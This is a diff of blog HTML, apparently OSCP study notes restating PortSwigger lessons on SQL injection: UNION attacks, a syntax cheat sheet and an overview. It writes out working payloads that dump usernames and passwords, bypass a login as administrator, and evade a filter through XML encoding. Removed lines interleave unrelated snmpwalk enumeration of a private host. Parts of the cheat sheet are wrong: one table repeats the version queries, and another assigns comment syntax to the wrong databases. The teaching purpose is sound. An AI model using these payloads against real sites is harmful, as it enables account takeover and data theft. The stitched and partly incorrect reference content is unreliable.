+<p>The reason for performing a SQL injection UNION attack is to be able to retrieve the results from an injected query. Generally, the interesting data that you want to retrieve will be in string form, so you need to find one or more columns in the original query results whose data type is, or is compatible with, string data.
+Having already determined the number of required columns, you can probe each column to test whether it can hold string data by submitting a series of ==UNION SELECT== payloads that place a string value into each column in turn. For example, if the query returns four columns, you would submit:</p>
+<div class="highlight"><pre><span></span><code><span class="s1">&#39; UNION SELECT &#39;</span><span class="n">a</span><span class="s1">&#39;,NULL,NULL,NULL--</span>
+<span class="s1">&#39;</span><span class="w"> </span><span class="k">UNION</span><span class="w"> </span><span class="k">SELECT</span><span class="w"> </span><span class="k">NULL</span><span class="p">,</span><span class="s1">&#39;a&#39;</span><span class="p">,</span><span class="k">NULL</span><span class="p">,</span><span class="k">NULL</span><span class="c1">--</span>
+<span class="s1">&#39; UNION SELECT NULL,NULL,&#39;</span><span class="n">a</span><span class="s1">&#39;,NULL--</span>
+<span class="s1">&#39;</span><span class="w"> </span><span class="k">UNION</span><span class="w"> </span><span class="k">SELECT</span><span class="w"> </span><span class="k">NULL</span><span class="p">,</span><span class="k">NULL</span><span class="p">,</span><span class="k">NULL</span><span class="p">,</span><span class="s1">&#39;a&#39;</span><span class="c1">--</span>
+</code></pre></div>
 
-<span class="nv">@kali</span><span class="p">:~$</span> <span class="n">snmpwalk</span> <span class="n">-c</span> <span class="n">public</span> <span class="n">-v1</span> <span class="n">192</span><span class="p">.</span><span class="n">168</span><span class="p">.</span><span class="n">50</span><span class="p">.</span><span class="n">151</span> <span class="n">1</span><span class="p">.</span><span class="n">3</span><span class="p">.</span><span class="n">6</span><span class="p">.</span><span class="n">1</span><span class="p">.</span><span class="n">4</span><span class="p">.</span><span class="n">1</span><span class="p">.</span><span class="n">77</span><span class="p">.</span><span class="n">1</span><span class="p">.</span><span class="n">2</span><span class="p">.</span><span class="n">25</span>
+<p>If the data type of a column is not compatible with string data, the injected query will cause a database error, such as:</p>
+<div class="highlight"><pre><span></span><code><span class="n">Conversion</span><span class="w"> </span><span class="n">failed</span><span class="w"> </span><span class="n">when</span><span class="w"> </span><span class="n">converting</span><span class="w"> </span><span class="n">the</span><span class="w"> </span><span class="n">varchar</span><span class="w"> </span><span class="n">value</span><span class="w"> </span><span class="s1">&#39;a&#39;</span><span class="w"> </span><span class="n">to</span><span class="w"> </span><span class="n">data</span><span class="w"> </span><span class="n">type</span><span class="w"> </span><span class="nb nb-Type">int</span><span class="o">.</span>
+</code></pre></div>
 
-<span class="nv">@kali</span><span class="p">:~$</span> <span class="n">snmpwalk</span> <span class="n">-c</span> <span class="n">public</span> <span class="n">-v1</span> <span class="n">192</span><span class="p">.</span><span class="n">168</span><span class="p">.</span><span class="n">50</span><span class="p">.</span><span class="n">151</span> <span class="n">1</span><span class="p">.</span><span class="n">3</span><span class="p">.</span><span class="n">6</span><span class="p">.</span><span class="n">1</span><span class="p">.</span><span class="n">2</span><span class="p">.</span><span class="n">1</span><span class="p">.</span><span class="n">25</span><span class="p">.</span><span class="n">4</span><span class="p">.</span><span class="n">2</span><span class="p">.</span><span class="n">1</span><span class="p">.</span><span class="n">2</span>
+<p>If an error does not occur, and the application's response contains some additional content including the injected string value, then the relevant column is suitable for retrieving string data.</p>
+<table>
+<thead>
+<tr>
+<th>🧪 LAB PRACTITIONER</th>
+</tr>
+</thead>
+<tbody>
+<tr>
+<td><a href="https://portswigger.net/web-security/sql-injection/union-attacks/lab-find-column-containing-text">SQL injection UNION attack, finding a column containing text</a></td>
+</tr>
+</tbody>
+</table>
+<h2>Using a SQL injection UNION attack to retrieve interesting data</h2>
+<p>When you have determined the number of columns returned by the original query and found which columns can hold string data, you are in a position to retrieve interesting data.
+Suppose that:
+* The original query returns two columns, both of which can hold string data.
+* The injection point is a quoted string within the ==WHERE== clause.
+* The database contains a table called ==users== with the columns ==username== and ==password==.</p>
+<p>⠀In this situation, you can retrieve the contents of the ==users== table by submitting the input:</p>
+<div class="highlight"><pre><span></span><code><span class="err">&#39;</span><span class="w"> </span><span class="k">UNION</span><span class="w"> </span><span class="k">SELECT</span><span class="w"> </span><span class="n">username</span><span class="p">,</span><span class="w"> </span><span class="n">password</span><span class="w"> </span><span class="k">FROM</span><span class="w"> </span><span class="n">users</span><span class="c1">--</span>
+</code></pre></div>
 
-<span class="nv">@kali</span><span class="p">:~$</span> <span class="n">snmpwalk</span> <span class="n">-c</span> <span class="n">public</span> <span class="n">-v1</span> <span class="n">192</span><span class="p">.</span><span class="n">168</span><span class="p">.</span><span class="n">50</span><span class="p">.</span><span class="n">151</span> <span class="n">1</span><span class="p">.</span><span class="n">3</span><span class="p">.</span><span class="n">6</span><span class="p">.</span><span class="n">1</span><span class="p">.</span><span class="n">2</span><span class="p">.</span><span class="n">1</span><span class="p">.</span><span class="n">25</span><span class="p">.</span><span class="n">6</span><span class="p">.</span><span class="n">3</span><span class="p">.</span><span class="n">1</span><span class="p">.</span><span class="n">2</span>
+<p>Of course, the crucial information needed to perform this attack is that there is a table called ==users== with two columns called ==username== and ==password==. Without this information, you would be left trying to guess the names of tables and columns. In fact, all modern databases provide ways of examining the database structure, to determine what tables and columns it contains.</p>
+<table>
+<thead>
+<tr>
+<th>🧪 LAB PRACTITIONER</th>
+</tr>
+</thead>
+<tbody>
+<tr>
+<td><a href="https://portswigger.net/web-security/sql-injection/union-attacks/lab-retrieve-data-from-other-tables">SQL injection UNION attack, retrieving data from other tables</a></td>
+</tr>
+</tbody>
+</table>
+<blockquote>
+<p><strong>Read more</strong>
+* [[Examining the database in SQL injection attacks]]</p>
+</blockquote>
+<h2>Retrieving multiple values within a single column</h2>
+<p>In the preceding example, suppose instead that the query only returns a single column.
+You can easily retrieve multiple values together within this single column by concatenating the values together, ideally including a suitable separator to let you distinguish the combined values. For example, on Oracle you could submit the input:</p>
+<div class="highlight"><pre><span></span><code><span class="s1">&#39; UNION SELECT username || &#39;</span><span class="o">~</span><span class="err">&#39;</span><span class="w"> </span><span class="o">||</span><span class="w"> </span><span class="n">password</span><span class="w"> </span><span class="k">FROM</span><span class="w"> </span><span class="n">users</span><span class="c1">--</span>
+</code></pre></div>
 
-<span class="nv">@kali</span><span class="p">:~$</span> <span class="n">snmpwalk</span> <span class="n">-c</span> <span class="n">public</span> <span class="n">-v1</span> <span class="n">192</span><span class="p">.</span><span class="n">168</span><span class="p">.</span><span class="n">50</span><span class="p">.</span><span class="n">151</span> <span class="n">1</span><span class="p">.</span><span class="n">3</span><span class="p">.</span><span class="n">6</span><span class="p">.</span><span class="n">1</span><span class="p">.</span><span class="n">2</span><span class="p">.</span><span class="n">1</span><span class="p">.</span><span class="n">6</span><span class="p">.</span><span class="n">13</span><span class="p">.</span><span class="n">1</span><span class="p">.</span><span class="n">3</span>
+<p>This uses the double-pipe sequence ==||== which is a string concatenation operator on Oracle. The injected query concatenates together the values of the ==username== and ==password== fields, separated by the ==~== character.
+The results from the query will let you read all of the usernames and passwords, for example:</p>
+<div class="highlight"><pre><span></span><code>...
+administrator~s3cure
+wiener~peter
+carlos~montoya
+...
+</code></pre></div>
+
+<p>Note that different databases use different syntax to perform string concatenation. For more details, see the <a href="https://portswigger.net/web-security/sql-injection/cheat-sheet">SQL injection cheat sheet</a>.</p>
+<table>
+<thead>
+<tr>
+<th>🧪 LAB PRACTITIONER</th>
+</tr>
+</thead>
+<tbody>
+<tr>
+<td><a href="https://portswigger.net/web-security/sql-injection/union-attacks/lab-retrieve-multiple-values-in-single-column">SQL injection UNION attack, retrieving multiple values in a single column</a></td>
+</tr>
+</tbody>
+</table>
+                <div class="clear"></div>
+
+                <div class="info">
+                    <a href="https://sfinx.kozow.com/2024/5/19/sqli-union/">posted at 21:05</a>
+                    &nbsp;&middot;&nbsp;<a href="https://sfinx.kozow.com/category/web.html" rel="tag">web</a>
+                </div>
+            </article>            <h4 class="date">May 19, 2024</h4>
+
+            <article class="post">
+                <h2 class="title">
+                    <a href="https://sfinx.kozow.com/2024/5/19/sqli-cheat-sheet/" rel="bookmark" title="Permanent Link to &quot;SQL Injection Cheat Sheet&quot;">SQL Injection Cheat Sheet</a>
+                </h2>
+
+                
+                
+
+                <h1>SQL injection cheat sheet</h1>
+<h1>OSCP/WEB/PORTSWIGGER/LearningPath/ServerSide/SQLINJECTION</h1>
+<p><img alt="Photo" src="https://sfinx.kozow.com/2024/5/19/sqli-cheat-sheet/SQLI_CHEAT_SHEET/black-green-cheat-sheet-stamp-black-green-cheat-sheet-stamp-illustration-graphic-concept-108947651.jpg.webp"></p>
+<p>This <strong>SQL injection</strong> cheat sheet contains examples of useful syntax that you can use to perform a variety of tasks that often arise when performing SQL injection attacks.</p>
+<h2>String concatenation</h2>
+<p>You can concatenate together multiple strings to make a single string.</p>
+<table>
+<thead>
+<tr>
+<th style="text-align: center;">Oracle</th>
+<th style="text-align: center;">=='foo'||'bar'==</th>
+</tr>
+</thead>
+<tbody>
+<tr>
+<td style="text-align: center;"><strong>Microsoft</strong></td>
+<td style="text-align: center;">=='foo'+'bar'==</td>
+</tr>
+<tr>
+<td style="text-align: center;"><strong>PostgreSQL</strong></td>
+<td style="text-align: center;">=='foo'||'bar'==</td>
+</tr>
+<tr>
+<td style="text-align: center;"><strong>MySQL</strong></td>
+<td style="text-align: center;">=='foo' 'bar'== [Note the space between the two strings]<br>==CONCAT('foo','bar')==</td>
+</tr>
+<tr>
+<td style="text-align: center;">## Substring</td>
+<td style="text-align: center;"></td>
+</tr>
+</tbody>
+</table>
+<p>You can extract part of a string, from a specified offset with a specified length. Note that the offset index is 1-based. Each of the following expressions will return the string ==ba==.</p>
+<table>
+<thead>
+<tr>
+<th style="text-align: center;">Oracle</th>
+<th style="text-align: center;">==SUBSTR('foobar', 4, 2)==</th>
+</tr>
+</thead>
+<tbody>
+<tr>
+<td style="text-align: center;"><strong>Microsoft</strong></td>
+<td style="text-align: center;">==SUBSTRING('foobar', 4, 2)==</td>
+</tr>
+<tr>
+<td style="text-align: center;"><strong>PostgreSQL</strong></td>
+<td style="text-align: center;">==SUBSTRING('foobar', 4, 2)==</td>
+</tr>
+<tr>
+<td style="text-align: center;"><strong>MySQL</strong></td>
+<td style="text-align: center;">==SUBSTRING('foobar', 4, 2)==</td>
+</tr>
+</tbody>
+</table>
+<h2>Comments</h2>
+<p>You can use comments to truncate a query and remove the portion of the original query that follows your input.</p>
+<table>
+<thead>
+<tr>
+<th style="text-align: center;">Oracle</th>
+<th style="text-align: center;">==--comment==</th>
+</tr>
+</thead>
+<tbody>
+<tr>
+<td style="text-align: center;"><strong>Microsoft</strong></td>
+<td style="text-align: center;">==/*comment*/==</td>
+</tr>
+<tr>
+<td style="text-align: center;"><strong>PostgreSQL</strong></td>
+<td style="text-align: center;">==#comment==</td>
+</tr>
+<tr>
+<td style="text-align: center;"><strong>MySQL</strong></td>
+<td style="text-align: center;">==-- comment==  [Note the space after the double dash]</td>
+</tr>
+</tbody>
+</table>
+<h2>Database version</h2>
+<p>You can query the database to determine its type and version. This information is useful when formulating more complicated attacks.</p>
+<table>
+<thead>
+<tr>
+<th style="text-align: center;">Oracle</th>
+<th style="text-align: center;">==SELECT banner FROM v$version==<br>==SELECT version FROM v$instance==</th>
+</tr>
+</thead>
+<tbody>
+<tr>
+<td style="text-align: center;"><strong>Microsoft</strong></td>
+<td style="text-align: center;">==SELECT @@version==</td>
+</tr>
+<tr>
+<td style="text-align: center;"><strong>PostgreSQL</strong></td>
+<td style="text-align: center;">==SELECT version()==</td>
+</tr>
+<tr>
+<td style="text-align: center;"><strong>MySQL</strong></td>
+<td style="text-align: center;">==SELECT @@version==</td>
+</tr>
+</tbody>
+</table>
+<h2>Database contents</h2>
+<p>You can list the tables that exist in the database, and the columns that those tables contain.</p>
+<table>
+<thead>
+<tr>
+<th style="text-align: center;">Oracle</th>
+<th style="text-align: center;">==SELECT banner FROM v$version==<br>==SELECT version FROM v$instance==</th>
+</tr>
+</thead>
+<tbody>
+<tr>
+<td style="text-align: center;"><strong>Microsoft</strong></td>
+<td style="text-align: center;">==SELECT @@version==</td>
+</tr>
+<tr>
+<td style="text-align: center;"><strong>PostgreSQL</strong></td>
+<td style="text-align: center;">==SELECT version()==</td>
+</tr>
+<tr>
+<td style="text-align: center;"><strong>MySQL</strong></td>
+<td style="text-align: center;">==SELECT @@version==</td>
+</tr>
+</tbody>
+</table>
+                <div class="clear"></div>
+
+                <div class="info">
+                    <a href="https://sfinx.kozow.com/2024/5/19/sqli-cheat-sheet/">posted at 21:03</a>
+                    &nbsp;&middot;&nbsp;<a href="https://sfinx.kozow.com/category/web.html" rel="tag">web</a>
+                </div>
+            </article>            <h4 class="date">May 19, 2024</h4>
+
+            <article class="post">
+                <h2 class="title">
+                    <a href="https://sfinx.kozow.com/2024/5/19/sql-injection/" rel="bookmark" title="Permanent Link to &quot;SQL Injection&quot;">SQL Injection</a>
+                </h2>
+
+                
+                
+
+                <h1>💉SQL Injection</h1>
+<h1>OSCP/WEB/PORTSWIGGER/LearningPath/ServerSide/SQLINJECTION</h1>
+<p><img alt="Photo" src="https://sfinx.kozow.com/2024/5/19/sql-injection/SQLI/SQL-Injection.jpg"></p>
+<p>In this section, we'll explain what SQL injection (SQLi) is, describe some common examples, explain how to find and exploit various kinds of SQL injection vulnerabilities, and summarize how to prevent SQL injection.</p>
+<p>For a brief resume on all payloads to use for SQL injection testing, try the following cheat sheet:</p>
+<blockquote>
+<p>[[SQL injection cheat sheet|SQL Injection Cheat Sheet !]]</p>
+</blockquote>
+<h2>Summary</h2>
+<ul>
+<li>[[💉SQL Injection/What is SQL injection (SQLi) ?|What is SQL injection (SQLi) ?]]</li>
+<li>[[💉SQL Injection/What is the impact of a successful SQL injection attack?|What is the impact of a successful SQL injection attack?]]</li>
+<li>[[💉SQL Injection/How to detect SQL injection vulnerabilities|How to detect SQL injection vulnerabilities]]</li>
+<li>[[💉SQL Injection/SQL injection in different parts of the query|SQL injection in different parts of the query]]</li>
+<li>[[💉SQL Injection/SQL injection examples|SQL injection examples]]</li>
+<li>[[💉SQL Injection/Retrieving hidden data|Retrieving hidden data]]</li>
+<li>[[💉SQL Injection/Subverting application logic|Subverting application logic]]</li>
+<li>[[💉SQL Injection/Retrieving data from other database tables|Retrieving data from other database tables]]</li>
+<li>[[💉SQL Injection/Blind SQL injection vulnerabilities|Blind SQL injection vulnerabilities]]</li>
+<li>[[💉SQL Injection/Second-order SQL injection|Second-order SQL injection]]</li>
+<li>[[💉SQL Injection/Examining the database|Examining the database]]</li>
+<li>[[💉SQL Injection/SQL injection in different contexts|SQL injection in different contexts]]</li>
+<li>[[💉SQL Injection/How to prevent SQL injection|How to prevent SQL injection]]</li>
+</ul>
+<h3>What is SQL injection (SQLi) ?</h3>
+<p>SQL injection (SQLi) is a web security vulnerability that allows an attacker to interfere with the queries that an application makes to its database. It generally allows an attacker to view data that they are not normally able to retrieve. This might include data belonging to other users, or any other data that the application itself is able to access. In many cases, an attacker can modify or delete this data, causing persistent changes to the application's content or behavior.
+In some situations, an attacker can escalate a SQL injection attack to compromise the underlying server or other back-end infrastructure, or perform a denial-of-service attack.</p>
+<p><a href="https://youtu.be/wX6tszfgYp4">What is SQL Injection</a><!-- {"preview":"true"} --></p>
+<hr>
+<h3>What is the impact of a successful SQL injection attack?</h3>
+<p>A successful SQL injection attack can result in unauthorized access to sensitive data, such as passwords, credit card details, or personal user information. Many high-profile data breaches in recent years have been the result of SQL injection attacks, leading to reputational damage and regulatory fines. In some cases, an attacker can obtain a persistent backdoor into an organization's systems, leading to a long-term compromise that can go unnoticed for an extended period.</p>
+<hr>
+<h3>How to detect SQL injection vulnerabilities</h3>
+<p>The majority of SQL injection vulnerabilities can be found quickly and reliably using Burp Suite's <a href="https://portswigger.net/burp/vulnerability-scanner">web vulnerability scanner</a>.
+SQL injection can be detected manually by using a systematic set of tests against every entry point in the application. This typically involves:
+* Submitting the single quote character =='== and looking for errors or other anomalies.
+* Submitting some SQL-specific syntax that evaluates to the base (original) value of the entry point, and to a different value, and looking for systematic differences in the resulting application responses.
+* Submitting Boolean conditions such as ==OR 1=1== and ==OR 1=2==, and looking for differences in the application's responses.
+* Submitting payloads designed to trigger time delays when executed within a SQL query, and looking for differences in the time taken to respond.
+* Submitting <a href="https://portswigger.net/burp/application-security-testing/oast">OAST</a> payloads designed to trigger an out-of-band network interaction when executed within a SQL query, and monitoring for any resulting interactions.</p>
+<hr>
+<h3>SQL injection in different parts of the query</h3>
+<p>Most SQL injection vulnerabilities arise within the <em>==WHERE==</em> clause of a <em>==SELECT==</em> query. This type of SQL injection is generally well-understood by experienced testers.
+But SQL injection vulnerabilities can in principle occur at any location within the query, and within different query types. The most common other locations where SQL injection arises are:
+* In <em>==UPDATE==</em> statements, within the updated values or the <em>==WHERE==</em> clause.
+* In <em>==INSERT==</em> statements, within the inserted values.
+* In <em>==SELECT==</em> statements, within the table or column name.
+* In <em>==SELECT==</em> statements, within the <em>==ORDER BY==</em> clause.</p>
+<hr>
+<h3>SQL injection examples</h3>
+<p>There are a wide variety of SQL injection vulnerabilities, attacks, and techniques, which arise in different situations. Some common SQL injection examples include:
+* <a href="https://portswigger.net/web-security/sql-injection#retrieving-hidden-data">Retrieving hidden data</a>, where you can modify a SQL query to return additional results.
+* <a href="https://portswigger.net/web-security/sql-injection#subverting-application-logic">Subverting application logic</a>, where you can change a query to interfere with the application's logic.
+* <a href="https://portswigger.net/web-security/sql-injection/union-attacks">UNION attacks</a>, where you can retrieve data from different database tables.
+* <a href="https://portswigger.net/web-security/sql-injection/blind">Blind SQL injection</a>, where the results of a query you control are not returned in the application's responses.</p>
+<hr>
+<h3>Retrieving hidden data</h3>
+<p>Consider a shopping application that displays products in different categories. When the user clicks on the Gifts category, their browser requests the URL:
+ ```
+https://insecure-website.com/products?category=Gifts</p>
+<div class="highlight"><pre><span></span><code>
+</code></pre></div>
+
+<p>This causes the application to make a SQL query to retrieve details of the relevant products from the database:</p>
+<div class="highlight"><pre><span></span><code><span class="k">SELECT</span><span class="w"> </span><span class="o">*</span><span class="w"> </span><span class="k">FROM</span><span class="w"> </span><span class="n">products</span><span class="w"> </span><span class="k">WHERE</span><span class="w"> </span><span class="n">category</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="s1">&#39;Gifts&#39;</span><span class="w"> </span><span class="k">AND</span><span class="w"> </span><span class="n">released</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="mi">1</span>
+</code></pre></div>
+
+<p>This SQL query asks the database to return:
+* all details (*)
+* from the products table
+* where the category is Gifts
+* and released is 1.</p>
+<p>⠀The restriction <em>==released = 1==</em> is being used to hide products that are not released. For unreleased products, presumably <em>==released = 0==</em>.
+The application doesn't implement any defenses against SQL injection attacks, so an attacker can construct an attack like:
+ ```
+https://insecure-website.com/products?category=Gifts'--</p>
+<div class="highlight"><pre><span></span><code>This results in the SQL query:
+```sql
+SELECT * FROM products WHERE category = &#39;Gifts&#39;--&#39; AND released = 1
+</code></pre></div>
+
+<p>The key thing here is that the double-dash sequence ==--== is a comment indicator in SQL, and means that the rest of the query is interpreted as a comment. This effectively removes the remainder of the query, so it no longer includes ==<em>AND released = 1</em>==. This means that all products are displayed, including unreleased products.
+Going further, an attacker can cause the application to display all the products in any category, including categories that they don't know about:
+ ```
+https://insecure-website.com/products?category=Gifts'+OR+1=1--</p>
+<div class="highlight"><pre><span></span><code>This results in the SQL query:
+```sql
+SELECT * FROM products WHERE category = &#39;Gifts&#39; OR 1=1--&#39; AND released = 1
+</code></pre></div>
+
+<p>The modified query will return all items where either the category is Gifts, or 1 is equal to 1. Since ==<em>1=1</em>== is always true, the query will return all items.</p>
+<blockquote>
+<p><strong>Warning</strong>
+Take care when injecting the condition ==OR 1=1== into a SQL query. Although this may be harmless in the initial context you're injecting into, it's common for applications to use data from a single request in multiple different queries. If your condition reaches an ==UPDATE== or ==DELETE== statement, for example, this can result in an accidental loss of data.</p>
+</blockquote>
+<table>
+<thead>
+<tr>
+<th style="text-align: center;">🧪LAB APPRENTICE</th>
+</tr>
+</thead>
+<tbody>
+<tr>
+<td style="text-align: center;"><a href="https://portswigger.net/web-security/sql-injection/lab-retrieve-hidden-data">SQL injection vulnerability in WHERE clause allowing retrieval of hidden data</a></td>
+</tr>
+</tbody>
+</table>
+<hr>
+<h3>Subverting application logic</h3>
+<p>Consider an application that lets users log in with a username and password. If a user submits the username <em>==wiener==</em> and the password <em>==bluecheese==</em>, the application checks the credentials by performing the following SQL query:</p>
+<div class="highlight"><pre><span></span><code><span class="k">SELECT</span><span class="w"> </span><span class="o">*</span><span class="w"> </span><span class="k">FROM</span><span class="w"> </span><span class="n">users</span><span class="w"> </span><span class="k">WHERE</span><span class="w"> </span><span class="n">username</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="s1">&#39;wiener&#39;</span><span class="w"> </span><span class="k">AND</span><span class="w"> </span><span class="n">password</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="s1">&#39;bluecheese&#39;</span>
+</code></pre></div>
+
+<p>If the query returns the details of a user, then the login is successful. Otherwise, it is rejected.
+Here, an attacker can log in as any user without a password simply by using the SQL comment sequence ==--== to remove the password check from the ==WHERE== clause of the query. For example, submitting the username ==administrator'--== and a blank password results in the following query:</p>
+<div class="highlight"><pre><span></span><code><span class="k">SELECT</span><span class="w"> </span><span class="o">*</span><span class="w"> </span><span class="k">FROM</span><span class="w"> </span><span class="n">users</span><span class="w"> </span><span class="k">WHERE</span><span class="w"> </span><span class="n">username</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="s1">&#39;administrator&#39;</span><span class="c1">--&#39; AND password = &#39;&#39;</span>
+</code></pre></div>
+
+<p>This query returns the user whose username is <em>==administrator==</em> and successfully logs the attacker in as that user.</p>
+<table>
+<thead>
+<tr>
+<th style="text-align: center;">🧪LAB APPRENTICE</th>
+</tr>
+</thead>
+<tbody>
+<tr>
+<td style="text-align: center;"><a href="https://portswigger.net/web-security/sql-injection/lab-retrieve-hidden-data">SQL injection vulnerability in WHERE clause allowing retrieval of hidden data</a></td>
+</tr>
+</tbody>
+</table>
+<hr>
+<h3>Retrieving data from other database tables</h3>
+<p>In cases where the results of a SQL query are returned within the application's responses, an attacker can leverage a SQL injection vulnerability to retrieve data from other tables within the database. This is done using the ==UNION== keyword, which lets you execute an additional ==SELECT== query and append the results to the original query.
+For example, if an application executes the following query containing the user input "Gifts":</p>
+<div class="highlight"><pre><span></span><code><span class="k">SELECT</span><span class="w"> </span><span class="n">name</span><span class="p">,</span><span class="w"> </span><span class="n">description</span><span class="w"> </span><span class="k">FROM</span><span class="w"> </span><span class="n">products</span><span class="w"> </span><span class="k">WHERE</span><span class="w"> </span><span class="n">category</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="s1">&#39;Gifts&#39;</span>
+</code></pre></div>
+
+<p>then an attacker can submit the input:</p>
+<div class="highlight"><pre><span></span><code><span class="err">&#39;</span><span class="w"> </span><span class="k">UNION</span><span class="w"> </span><span class="k">SELECT</span><span class="w"> </span><span class="n">username</span><span class="p">,</span><span class="w"> </span><span class="n">password</span><span class="w"> </span><span class="k">FROM</span><span class="w"> </span><span class="n">users</span><span class="c1">--</span>
+</code></pre></div>
+
+<p>This will cause the application to return all usernames and passwords along with the names and descriptions of products.</p>
+<blockquote>
+<p><strong>Read more</strong>
+* [[SQL injection UNION attacks]]</p>
+</blockquote>
+<hr>
+<h3>Blind SQL injection vulnerabilities</h3>
+<p>Many instances of SQL injection are blind vulnerabilities. This means that the application does not return the results of the SQL query or the details of any database errors within its responses. Blind vulnerabilities can still be exploited to access unauthorized data, but the techniques involved are generally more complicated and difficult to perform.
+Depending on the nature of the vulnerability and the database involved, the following techniques can be used to exploit blind SQL injection vulnerabilities:
+* You can change the logic of the query to trigger a detectable difference in the application's response depending on the truth of a single condition. This might involve injecting a new condition into some Boolean logic, or conditionally triggering an error such as a divide-by-zero.
+* You can conditionally trigger a time delay in the processing of the query, allowing you to infer the truth of the condition based on the time that the application takes to respond.
+* You can trigger an out-of-band network interaction, using OAST techniques. This technique is extremely powerful and works in situations where the other techniques do not. Often, you can directly exfiltrate data via the out-of-band channel, for example by placing the data into a DNS lookup for a domain that you control.</p>
+<blockquote>
+<p><strong>Read more</strong>
+* <a href="https://portswigger.net/web-security/sql-injection/blind">Blind SQL injection</a></p>
+</blockquote>
+<hr>
+<h3>Second-order SQL injection</h3>
+<p>First-order SQL injection arises where the application takes user input from an HTTP request and, in the course of processing that request, incorporates the input into a SQL query in an unsafe way.
+In second-order SQL injection (also known as stored SQL injection), the application takes user input from an HTTP request and stores it for future use. This is usually done by placing the input into a database, but no vulnerability arises at the point where the data is stored. Later, when handling a different HTTP request, the application retrieves the stored data and incorporates it into a SQL query in an unsafe way.</p>
+<p><img alt="Photo" src="https://sfinx.kozow.com/2024/5/19/sql-injection/SQLI/image 2.jpg"></p>
+<p>Second-order SQL injection often arises in situations where developers are aware of SQL injection vulnerabilities, and so safely handle the initial placement of the input into the database. When the data is later processed, it is deemed to be safe, since it was previously placed into the database safely. At this point, the data is handled in an unsafe way, because the developer wrongly deems it to be trusted.</p>
+<hr>
+<h3>Examining the database</h3>
+<p>Some core features of the SQL language are implemented in the same way across popular database platforms, and so many ways of detecting and exploiting SQL injection vulnerabilities work identically on different types of database.
+However, there are also many differences between common databases. These mean that some techniques for detecting and exploiting SQL injection work differently on different platforms. For example:</p>
+<ul>
+<li>Syntax for string concatenation.</li>
+<li>Comments.</li>
+<li>Batched (or stacked) queries.</li>
+<li>Platform-specific APIs.</li>
+<li>Error messages.</li>
+</ul>
+<blockquote>
+<p><strong>Read more</strong>
+* <a href="https://portswigger.net/web-security/sql-injection/cheat-sheet">SQL injection cheat sheet</a></p>
+</blockquote>
+<p>Following initial identification of a SQL injection vulnerability, it is generally useful to obtain some information about the database itself. This information can often pave the way for further exploitation.
+You can query the version details for the database. The way that this is done depends on the database type, so you can infer the database type from whichever technique works. For example, on Oracle you can execute:</p>
+<div class="highlight"><pre><span></span><code><span class="k">SELECT</span><span class="w"> </span><span class="o">*</span><span class="w"> </span><span class="k">FROM</span><span class="w"> </span><span class="n">v$version</span>
+</code></pre></div>
+
+<p>You can also determine what database tables exist, and which columns they contain. For example, on most databases you can execute the following query to list the tables:</p>
+<div class="highlight"><pre><span></span><code><span class="k">SELECT</span><span class="w"> </span><span class="o">*</span><span class="w"> </span><span class="k">FROM</span><span class="w"> </span><span class="n">information_schema</span><span class="p">.</span><span class="n">tables</span>
+</code></pre></div>
+
+<blockquote>
+<p><strong>Read more</strong>
+* [[Examining the database in SQL injection attacks]]
+* [[SQL injection cheat sheet]]</p>
+</blockquote>
+<hr>
+<h3>SQL injection in different contexts</h3>
+<p>In all of the labs so far, you've used the query string to inject your malicious SQL payload. However, it's important to note that you can perform SQL injection attacks using any controllable input that is processed as a SQL query by the application. For example, some websites take input in JSON or XML format and use this to query the database.
+These different formats may even provide alternative ways for you to <a href="https://portswigger.net/web-security/essential-skills/obfuscating-attacks-using-encodings#obfuscation-via-xml-encoding">obfuscate attacks</a> that are otherwise blocked due to WAFs and other defense mechanisms. Weak implementations often just look for common SQL injection keywords within the request, so you may be able to bypass these filters by simply encoding or escaping characters in the prohibited keywords. For example, the following XML-based SQL injection uses an XML escape sequence to encode the ==S== character in ==SELECT==:</p>
+<div class="highlight"><pre><span></span><code><span class="nt">&lt;stockCheck&gt;</span>
+<span class="w">    </span><span class="nt">&lt;productId&gt;</span>
+<span class="w">    </span>123
+<span class="w">    </span><span class="nt">&lt;/productId&gt;</span>
+<span class="w">    </span><span class="nt">&lt;storeId&gt;</span>
+<span class="w">    </span>999<span class="w"> </span><span class="ni">&amp;#x53;</span>ELECT<span class="w"> </span>*<span class="w"> </span>FROM<span class="w"> </span>information_schema.tables
+<span class="w">    </span><span class="nt">&lt;/storeId&gt;</span>
+<span class="w">    </span><span class="nt">&lt;/stockCheck&gt;</span>
+</code></pre></div>
+
+<p>This will be decoded server-side before being passed to the SQL interpreter.</p>
+<table>
+<thead>
+<tr>
+<th style="text-align: center;">🧪LAB APPRENTICE</th>
+</tr>
+</thead>
+<tbody>
+<tr>
+<td style="text-align: center;"><a href="https://portswigger.net/web-security/sql-injection/lab-sql-injection-with-filter-bypass-via-xml-encoding">SQL injection with filter bypass via XML encoding</a></td>
+</tr>
+</tbody>
+</table>
+<hr>
+<h3>How to prevent SQL injection</h3>
+<p>Most instances of SQL injection can be prevented by using parameterized queries (also known as prepared statements) instead of string concatenation within the query.
+The following code is vulnerable to SQL injection because the user input is concatenated directly into the query:</p>
+<div class="highlight"><pre><span></span><code><span class="n">String</span><span class="w"> </span><span class="n">query</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="s">&quot;SELECT * FROM products WHERE category = &#39;&quot;</span><span class="o">+</span><span class="w"> </span><span class="n">input</span><span class="w"> </span><span class="o">+</span><span class="w"> </span><span class="s">&quot;&#39;&quot;</span><span class="p">;</span>
+<span class="w">    </span><span class="n">Statement</span><span class="w"> </span><span class="n">statement</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="n">connection</span><span class="p">.</span><span class="n">createStatement</span><span class="p">();</span>
+<span class="w">    </span><span class="n">ResultSet</span><span class="w"> </span><span class="n">resultSet</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="n">statement</span><span class="p">.</span><span class="n">executeQuery</span><span class="p">(</span><span class="n">query</span><span class="p">);</span>
+</code></pre></div>
+
+<p>This code can be easily rewritten in a way that prevents the user input from interfering with the query structure:</p>
